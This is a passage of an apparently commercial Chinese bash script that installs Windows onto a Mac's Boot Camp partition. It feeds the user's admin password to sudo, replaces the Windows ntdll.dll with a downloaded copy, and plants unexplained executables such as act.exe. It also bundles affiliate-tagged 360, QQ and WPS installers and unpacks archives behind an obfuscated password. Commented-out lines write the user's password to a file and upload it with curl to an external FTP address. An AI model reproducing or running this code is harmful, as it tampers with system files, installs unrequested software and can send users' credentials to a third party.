if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/WindowsSupport.dmg WLLOS/WindowsSupport.dmg" password "$pass" with administrator privileges
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/BootCamp.zip WLLOS/BootCamp.zip" password "$pass" with administrator privileges
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/${drvname} WLLOS/${drvname}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/WindowsSupport.dmg WLLOS/WindowsSupport.dmg
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/BootCamp.zip WLLOS/BootCamp.zip
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/"$drvname" WLLOS/"$drvname"
fi
fi


if [ "$ntcpp" ]; then

echo "SySFile=$drvname" > "/tmp/WLLOS/MacSys"
echo "Index=$index" >> "/tmp/WLLOS/MacSys"
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/WLLOS/MacSys WLLOS/MacSys
if [ "$Win11" ]; then
echo "$drvname" > "/tmp/WLLOS/Win11"
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/Win11 WLLOS/Win11
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/Win11.exe WLLOS/Win11.exe
fi
if [ "$wf16" ]; then
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/16wifi.exe 16wifi.exe
fi
if [ "$lanya" ]; then
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/BroadcomBluetooth64.exe WLLOS/BroadcomBluetooth64.exe
fi
if [ "$xtyh" ]; then
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/yxk.exe WLLOS/yxk.exe
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/act.exe WLLOS/act.exe
fi
if [ "$Hostname" ]; then
echo "$drvname" > "/tmp/WLLOS/USB"
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/WLLOS/USB WLLOS/USB
fi
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/ntdll.dll Windows/System32/ntdll.dll
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/WindowsSupport.dmg WLLOS/WindowsSupport.dmg
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/BootCamp.zip WLLOS/BootCamp.zip
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/"$drvname" WLLOS/"$drvname"
if [ "$zdbt" ]; then
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/bt.exe WLLOS/bt.exe
fi
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/azbc.exe WLLOS/azbc.exe
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/bcsz.exe WLLOS/bcsz.exe
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/azbcgx.exe WLLOS/azbcgx.exe
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/qdzh.exe WLLOS/qdzh.exe

fi


diskutil mount ${restore_device}

fi

if [ ! "$winclone7" ]; then
if [ "$MBR10" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
rm -rf /tmp/$index
diskutil unmount disk0s1
if [ "$ntfs10" ]; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}" password "$pass" with administrator privileges
do shell script "rm -rf /System/Library/Filesystems/fusefs_txantfs.fs" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /System/Library/Filesystems/fusefs_txantfs.fs/Support/mkntfs -Q -L BOOTCAMP ${restore_device}
echo "$pass" | sudo -S sudo rm -rf /System/Library/Filesystems/fusefs_txantfs.fs
fi
diskutil mount ${restore_device}
if [ $? -ne 0 ] ; then
diskutil eraseVolume MS-DOS DOS ${restore_device}
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo cp -R /tmp/fusefs_txantfs.fs /System/Library/Filesystems
fi
read -t 5 -p "格式化成NTFS失败，5秒后重试..."
fi
#/tmp/keka7z x ~/Downloads/JG_Download/$drvname -o/tmp 1 -r
#mv /tmp/1/* /tmp/ISODIR/
#rm -rf /tmp/ISODIR/bootmgr.efi
#rm -rf /tmp/ISODIR/efi
if [ ! "$re1909" ]; then
echo "$pass" | sudo -S sudo /tmp/keka7z x ~/Downloads/JG_Download/$drvname -o/tmp $index/Windows/System32/Recovery -r
echo "$pass" | sudo -S sudo /tmp/keka7z a /tmp/$index/Windows/System32/Recovery/Winre.wim /tmp/RE/Windows
echo "$pass" | sudo -S sudo mv /tmp/$index/Windows/System32/Recovery/Winre.wim /tmp/ISODIR/sources/boot.wim
else
echo "$pass" | sudo -S sudo cp ~/Downloads/JG_Download/PEDRV.dmg /tmp/ISODIR/sources/boot.wim
echo "$pass" | sudo -S sudo /tmp/keka7z a /tmp/ISODIR/sources/boot.wim /tmp/RE/Windows
fi
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
cp -R /tmp/ISODIR/* "${bootcamp_mounted}"
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img" password "$pass" with administrator privileges
do shell script "/tmp/pigz -6 -p 10 -k /tmp/boot.img" password "$pass" with administrator privileges
do shell script "/tmp/winclone5 --self-extract -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/ntfsclone -s ${restore_device} -o /tmp/boot.img
echo "$pass" | sudo -S sudo /tmp/pigz -6 -p 10 -k /tmp/boot.img
echo "$pass" | sudo -S sudo /tmp/winclone5 --self-extract -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 --self-extract -l -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -l -p ${restore_device}
fi
fi
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
mkdir -p "${bootcamp_mounted}/WLLOS"
mkdir -p "${bootcamp_mounted}/Windows/System32"
clear && printf "\e[3J"
echo "\033[36m请等待，即将写入完成！！！\033[0m"
cp ~/Downloads/JG_Download/"$drvname" "${bootcamp_mounted}/WLLOS"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}/WLLOS"
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}/WLLOS"
cp /tmp/ntdll.dll "${bootcamp_mounted}/Windows/System32"
cp /tmp/azbc.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/bcsz.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/azbcgx.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/qdzh.exe "${bootcamp_mounted}/WLLOS"
if [ "$xtyh" ]; then
cp /tmp/yxk.exe "${bootcamp_mounted}/WLLOS"
cp /tmp/act.exe "${bootcamp_mounted}/WLLOS"
fi
if [ "$Win11" ]; then
echo "$drvname" > "${bootcamp_mounted}/WLLOS/Win11"
cp /tmp/Win11.exe "${bootcamp_mounted}/WLLOS"
fi
#cp -R /tmp/1/sources/sxs "${bootcamp_mounted}/WLLOS"
echo "SySFile=$drvname" > "${bootcamp_mounted}/WLLOS/MacSys"
echo "Index=$index" >> "${bootcamp_mounted}/WLLOS/MacSys"
echo "MBR=MBR" >> "${bootcamp_mounted}/WLLOS/MBR10"
diskutil unmount ${restore_device}
diskutil mount ${restore_device}
#diskutil unmount ${restore_device}
#echo "$pass" | sudo -S sudo /tmp/ntfscp -f ${restore_device} ~/Downloads/JG_Download/"$drvname" /"$drvname"
#echo "$pass" | sudo -S sudo /tmp/ntfscp -f ${restore_device} ~/Downloads/BootCamp/WindowsSupport.dmg /WindowsSupport.dmg
#echo "$pass" | sudo -S sudo /tmp/ntfscp -f ${restore_device} ~/Downloads/JG_Download/BootCamp.zip /BootCamp.zip
#diskutil mount ${restore_device}
#open /Volumes/BOOTCAMP
fi
fi


if [ ! "$ntcp" ]; then
if [ -e "/Volumes/DOS" ]; then
echo
echo
echo 请通知技术员，重启电脑后，再重新安装！
echo
echo
if [[ $modelxh != "10.5"* ]]; then
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "请通知技术员，重启电脑后，再重新安装！" buttons {"OK"}'
fi
fi
echo
exit
fi
fi

clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences"
killall WeChat
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi
if [ "$sipp" ]; then
echo
echo "\033[36m手动切换！！！\033[0m"
exit 0
fi
if [[ $modelxh = "10.12"* ]]; then
if [ "$sip" ]; then
echo
echo "\033[36m手动切换！！！\033[0m"
exit 0
fi
fi
open /System/Library/PreferencePanes/StartupDisk.prefPane
if [[ $modelxh != "10.5"* ]]; then
if [[ $modelxh != "10.6"* ]]; then
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
fi
fi
open /System/Library/PreferencePanes/StartupDisk.prefPane
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
exit 0
fi



if [[ $modelxh = "10.4"* ]]; then
Winclone111="1"
fi
if [[ $modelxh = "10.5"* ]]; then
Winclone222="1"
fi

if [ "$DrvWin" ]; then
/tmp/aria2c -c -o boot.zip --console-log-level=warn --summary-interval=888888888 $ip5/peboot.zip -d /tmp
else
if [[ $modelxh = "10.6"* ]]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/boot2.zip">/dev/null 2>&1
else
if [ "$Winclone222" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/wl2.zip">/dev/null 2>&1
else
if [ "$Winclone111" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/wl1.zip">/dev/null 2>&1
else
/tmp/aria2c -c -o boot.zip --console-log-level=warn --summary-interval=888888888 $ip5/boott22.zip -d /tmp
fi
fi
fi
fi

unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1

if [ "$Winclone222" ]; then
if [ ! -f "/tmp/winclone" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/wl2.zip">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
fi
if [ ! -f "/tmp/winclone.perl" ]; then
echo
read -t 10 -p "安装工具无法下载，10秒后自动重试..."
Winxt
fi

else

if [ "$Winclone111" ]; then
if [ ! -f "/tmp/winclone" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/wl1.zip">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
fi
if [ ! -f "/tmp/winclone.perl" ]; then
echo
read -t 10 -p "安装工具无法下载，10秒后自动重试..."
Winxt
fi

else
if [ ! -f "/tmp/winclone" ]; then
curl -# -C - --connect-timeout 10 -o "/tmp/boot.zip" "$ip5/boott22.zip">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/boot.zip" -d "/tmp">/dev/null 2>&1
fi

if [ ! -f "/tmp/winclone" ]; then
echo
read -t 10 -p "安装工具无法下载，10秒后自动重试..."
Winxt
fi

fi
fi


clear && printf "\e[3J"


if [[ $modelxh = "10.6"* ]]; then
Winclone555="1"
fi
if [[ $modelxh = "10.7"* ]]; then
Winclone555="1"
fi
if [[ $modelxh = "10.8"* ]]; then
Winclone555="1"
fi
if [[ $modelxh = "10.9"* ]]; then
Winclone555="1"
fi
if [[ $modelxh = "10.11"* ]]; then
Winclone666="1"
fi
if [[ $modelbb = *"MacBookAir7,2"* ]]; then
if [[ $modelxh = "10.10"* ]]; then
Winclone666="1"
fi
else
if [[ $modelxh = "10.10"* ]]; then
Winclone555="1"
fi
fi
if [[ $modelbb = *"MacBook8,1"* ]]; then
if [[ $modelxh = "10.10"* ]]; then
Winclone666="1"
fi
fi


if [ "$DrvWin10" ]; then
clear && printf "\e[3J"


/tmp/aria2c -c -o SSD.zip --console-log-level=warn --summary-interval=888888888 $osip/SSD.zip -d /tmp >/dev/null 2>&1

unzip -o /tmp/SSD.zip -d /tmp >/dev/null 2>&1


if [ ! "$xtyh" ]; then
/tmp/aria2c -c -o soft.exe $ip5/soft1.exe -d /tmp/SSD/Mbox/soft
else
/tmp/aria2c -c -o soft.exe $ip5/soft.exe -d /tmp/SSD/Mbox/soft
fi

if [ "$zmaz" ]; then
echo 111 >/tmp/SSD/Mbox/soft/zmaz.txt
else
echo 111 >/tmp/SSD/Mbox/soft/zmaz.txt
fi

clear && printf "\e[3J"

if [ -f ~/Downloads/JG_Download/"$drvname" ]; then


if [[ $modelxh = "10.10"* ]]; then
/tmp/tools/bin/wimexport ~/Downloads/JG_Download/"$drvname" "$index" /tmp/Windows.wim
fi

if [[ $modelxh = "10.11"* ]]; then
/tmp/tools/bin/wimexport ~/Downloads/JG_Download/"$drvname" "$index" /tmp/Windows.wim
fi

if [[ $modelxh = "10.12"* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [[ $modelxh = "10.13"* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [[ $modelxh = "10.14"* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [[ $modelxh = "10.15"* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [[ $modelxh = "11."* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [[ $modelxh = "12."* ]]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

if [ "$zxos" ]; then
mv ~/Downloads/JG_Download/"$drvname" /tmp/Windows.wim
azdrv="1"
fi

fi


if [[ $modelxh = "10.10"* ]]; then
Winclone666="1"
fi

if [ "$Winclone666" ]; then
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -l -p ${restore_device} -i "$index"
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device} -i "$index"
fi
else
if [ "$MBR10" ]; then
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -l -p ${restore_device} -i "$index"
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -e -p ${restore_device} -i "$index"
fi
fi


if [ $? -ne 0 ] ; then
if [ "$azdrv" ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/"$drvname"
fi
clear && printf "\e[3J"
echo
echo
echo
echo
read -s -n1 -p "安装失败, 请重启再试！！！"
Start_menu
fi


if [ "$azdrv" ]; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/"$drvname"
fi


if [ "$Winclone666" ]; then
mkdir /tmp/666
diskutil unmount ${restore_device}
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666 
bootcamp_mounted="/tmp/666"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone -m ${restore_device})
fi

cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}"
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}"


if [ ! -f "${bootcamp_mounted}"/Windows/INF/oem0.inf ]; then
oemd="oem0"
else
echo
if [ -f "${bootcamp_mounted}"/Windows/INF/oem1.inf ]; then
echo
if [ -f "${bootcamp_mounted}"/Windows/INF/oem2.inf ]; then
echo
if [ -f "${bootcamp_mounted}"/Windows/INF/oem3.inf ]; then
echo
else
oemd="oem3"
fi
else
oemd="oem2"
fi
else
oemd="oem1"
fi
fi

cp /tmp/SSD/AppleSSD.sys "${bootcamp_mounted}"/Windows/System32/drivers/AppleSSD.sys
cp /tmp/SSD/AppleSSD.inf "${bootcamp_mounted}"/Windows/INF/"$oemd".inf
mkdir "${bootcamp_mounted}"/Windows/System32/DriverStore/FileRepository/applessd.inf_amd64_11de8b3678d342cf
cp /tmp/SSD/AppleSSD.sys "${bootcamp_mounted}"/Windows/System32/DriverStore/FileRepository/applessd.inf_amd64_11de8b3678d342cf
cp /tmp/SSD/AppleSSD.inf "${bootcamp_mounted}"/Windows/System32/DriverStore/FileRepository/applessd.inf_amd64_11de8b3678d342cf
cp /tmp/SSD/AppleSSD.cat "${bootcamp_mounted}"/Windows/System32/DriverStore/FileRepository/applessd.inf_amd64_11de8b3678d342cf
cp /tmp/SSD/AppleSSD.cat "${bootcamp_mounted}"/Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/"$oemd".cat

echo "$pass" | sudo -S sudo /tmp/SSD/reged -C -I "${bootcamp_mounted}"/Windows/System32/config/SYSTEM "_" /tmp/SSD/"$oemd".reg


mkdir -p "${bootcamp_mounted}/MBox/soft"
cp -R "/tmp/SSD/Mbox" "${bootcamp_mounted}"
cp -R "/tmp/SSD/Windows" "${bootcamp_mounted}"

diskutil unmount ${restore_device}
diskutil mount ${restore_device}


if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /usr/bin/security authorizationdb write system.preferences.startupdisk allow
fi


killall "Safari" >/dev/null 2>&1
killall "Google Chrome" >/dev/null 2>&1
killall "Firefox" >/dev/null 2>&1
killall "WeChat" >/dev/null 2>&1
killall "QQ" >/dev/null 2>&1
osascript <<EOD
activate application "Terminal"
tell application "System Events"
set visible of processes where name is not "Terminal" to false
end tell
EOD
clear && printf "\e[3J"
echo
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
echo
echo
echo
osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
open /System/Library/PreferencePanes/StartupDisk.prefPane
exit
fi


if [ -f ~/Downloads/JG_Download/"$xtname" ]; then

clear && printf "\e[3J"
echo



if [ "$zxos" ]; then
ntcp="1"
fi


if [ "$ntcp" ]; then
/tmp/aria2c -c -o cp.zip $ip5/cp.zip -d /tmp
unzip -o /tmp/cp.zip -d /tmp
if [ ! -f "/private/tmp/cp/other/ntfsresize" ]; then
read -t 10 -p "安装工具cp无法下载，10秒后自动重试..."
Winxt
fi
fi


if [ "$soft" ]; then

if [ ! -f /tmp/rar.exe ]; then
/tmp/aria2c -c -o rar.exe  $ip5/1809.exe -d /tmp
if [ ! -f /tmp/rar.exe ]; then
read -s -n1 -p "部署文件无法下载，按任意键重试 ... "
Winxt
fi
fi

#/tmp/aria2c -c -o 360se+266372+n2ff5167499.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360se+266372+n2ff5167499.exe -d /tmp
/tmp/aria2c -c -o QQBrowser_subid@202014_urlid@202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/QQBrowser_Setup_9.2.5170.402_9.2.exe -d /tmp
/tmp/aria2c -c -o qqpcmgr_202014.exe --console-log-level=warn --summary-interval=888888888 https://cdn.zjbl.qq.com/app/qqpcmgr_v15.0.22122.210_s1241.exe -d /tmp
/tmp/aria2c -c -o wpssetup_k3464024_206128.exe --console-log-level=warn --summary-interval=888888888 https://jifendownload.2345.cn/jifen_2345/wpssetup_k3464024_206128.exe -d /tmp
/tmp/aria2c -c -o MarketSetup_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/MarketSetup_266372.exe -d /tmp
/tmp/aria2c -c -o 360zip_yqlm_266372.exe --console-log-level=warn --summary-interval=888888888 https://dl.360safe.com/netunion/20140425/360zip_yqlm_266372.exe -d /tmp
fi


/tmp/aria2c -c -o bt.exe $ip5/bt.exe -d /tmp

	
mv ~/Downloads/JG_Download/"$xtname" /tmp/Windows.wim

if [[ $modelxh = "10.10"* ]]; then
Winclone666="1"
fi

if [ "$Winclone666" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 --self-extract -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 --self-extract -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone --self-extract -p ${restore_device} -i 1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone --self-extract -p ${restore_device} -i 1
fi
fi

if [ $? -ne 0 ] ; then
mv /tmp/Windows.wim ~/Downloads/JG_Download/"$xtname"
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
rm -rf /Volumes/EFI/EFI/APPLE/CACHES
rm -rf /Volumes/EFI/EFI/Boot
rm -rf /Volumes/EFI/EFI/Microsoft
if [ "$Winclone666" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "diskutil mount disk0s1" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo diskutil mount disk0s1
fi
open /Volumes/EFI
echo "安装失败！！！${restore_device}.请检查EFI分区情况"
echo
read -s -n1 -p "按任意键继续修复引导 ... "
if [ "$Winclone666" ]; then
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone6 -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone6 -e -p ${restore_device}
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -e -p ${restore_device}" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /tmp/winclone -e -p ${restore_device}
fi
fi
if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
echo "安装失败！！！${restore_device}.请检查磁盘分区情况！"
exit -1
fi
fi
fi


mv /tmp/Windows.wim ~/Downloads/JG_Download/"$xtname"


if [[ $modelxh = "12."* ]]; then
Winclone666="1"
fi


if [ "$Winclone666" ]; then
rm -rf /tmp/666
mkdir /tmp/666
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
echo "mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666" > /tmp/ntfs.sh
osascript <<EOD
do shell script "bash /tmp/ntfs.sh" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo mount_ntfs -o rw,nobrowse ${restore_device} /tmp/666
fi
bootcamp_mounted="/tmp/666"
else
if [ "$ntcp" ]; then
diskutil unmount ${restore_device}
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/BootCamp.zip BootCamp.zip" password "$pass" with administrator privileges
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/WindowsSupport.dmg WindowsSupport.dmg" password "$pass" with administrator privileges
do shell script "/tmp/tools/sbin/ntfscp -f ${restore_device} /tmp/bt.exe Mbox/soft/bt.exe" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/JG_Download/BootCamp.zip BootCamp.zip
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} $HOME/Downloads/BootCamp/WindowsSupport.dmg WindowsSupport.dmg 
echo "$pass" | sudo -S sudo /private/tmp/tools/sbin/ntfscp -f ${restore_device} /private/tmp/bt.exe Mbox/soft/bt.exe
#echo "$pass" | sudo -S sudo /private/tmp/cp/other/ntfscp -f ${restore_device} ~/Downloads/JG_Download/BootCamp.zip BootCamp.zip
fi
else
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/tmp/winclone -m ${restore_device}" password "$pass" with administrator privileges
EOD
bootcamp_mounted="/Volumes/Windows"
else
bootcamp_mounted=$(echo "$pass" | sudo -S sudo /tmp/winclone -m ${restore_device})
fi
fi
fi

if [ ! "$ntcp" ]; then
cp ~/Downloads/BootCamp/WindowsSupport.dmg "${bootcamp_mounted}"
cp ~/Downloads/JG_Download/BootCamp.zip "${bootcamp_mounted}"
cp /tmp/bt.exe "${bootcamp_mounted}/Mbox/soft"
fi

if [ "$soft" ]; then
mv "${bootcamp_mounted}/MBox/soft/rar.exe" "${bootcamp_mounted}/MBox/soft/rar2.exe"
cp "/tmp/rar.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/QQBrowser_subid@202014_urlid@202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360se+266372+n2ff5167499.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/qqpcmgr_202014.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/wpssetup_k3464024_206128.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/MarketSetup_266372.exe" "${bootcamp_mounted}/Mbox/soft"
cp "/tmp/360zip_yqlm_266372.exe" "${bootcamp_mounted}/Mbox/soft"
fi

if [ ! "$ntcp" ]; then
diskutil unmount ${restore_device}
fi
diskutil mount ${restore_device}
#echo "TBName=$tbid" > /tmp/mac.txt
#echo "TVName=$TVName" >> /tmp/mac.txt
#echo "PSName=$pass" >> /tmp/mac.txt
if [ -f /tmp/mac.txt ]; then
#curl --connect-timeout 10 -m 20 -T /tmp/mac.txt -u $ftpm ftp://43.138.25.54>/dev/null 2>&1
echo
fi
#rm -rf /tmp/mac.txt
clear && printf "\e[3J"
echo
echo	
#echo TeamViewerID: "\033[36m${TVID}\033[0m"
echo	
echo ID: "\033[36m${tbid}\033[0m"		
echo
echo "\033[36m安装系统写入完成！！！\033[0m"
killall "System Preferences" >/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "/usr/bin/security authorizationdb write system.preferences.startupdisk allow" password "$pass" with administrator privileges
EOD
else
